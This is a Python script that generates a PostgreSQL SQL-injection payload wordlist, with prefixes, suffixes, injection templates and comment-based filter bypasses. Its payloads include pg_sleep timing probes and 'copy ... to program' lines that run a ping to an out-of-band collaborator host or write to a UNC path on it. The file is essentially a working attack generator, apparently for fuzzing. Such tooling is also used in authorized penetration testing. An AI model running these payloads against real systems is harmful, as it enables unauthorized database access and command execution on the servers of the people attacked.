# resources
# https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md

prefixes = [
    '',
    ')',
    '\'',
    '\')',
    '"',
    '")',
]
prefixes += [s + ';' for s in prefixes]

suffixes = [
    '',
    '--',
    '/*',
    '%00'
]
suffixes += [';' + s for s in suffixes]

quotation_marks = [
    '\'',
    '$$'
]

templates = [
    '\'||({payload})||\'',
    '"||({payload})||"',
    '{prefix}{payload}{suffix}',
    '{prefix} union {payload}{suffix}',
    '{prefix}({payload}){suffix}',
    '{prefix}||({payload}){suffix}'
]

payloads = [
    'select pg_sleep(20)',
    'select 1 from pg_sleep(20)',
    'copy (select {quotation_mark}{quotation_mark}) to program {quotation_mark}ping {collaborator}{quotation_mark}',
    'copy (select {quotation_mark}{quotation_mark}) to {quotation_mark}\\\\\\\\{collaborator}\\\\a{quotation_mark}',
]

def generate():
    wordlist = []

    # generic
    for quotation_mark in quotation_marks:
        for template in templates:
            for payload in payloads:
                for prefix in prefixes:
                    for suffix in suffixes:
                        word = template
                        word = word.replace('{prefix}',prefix)
                        word = word.replace('{suffix}',suffix)
                        word = word.replace('{payload}',payload)
                        word = word.replace('{quotation_mark}',quotation_mark)
                        if word not in wordlist:
                            wordlist.append(word)
    
    # bypasses
    temp_wordlist = wordlist
    for word in temp_wordlist:
        word = word.replace(' ','/**/')
        if word not in wordlist:
            wordlist.append(word)
    
    return wordlist
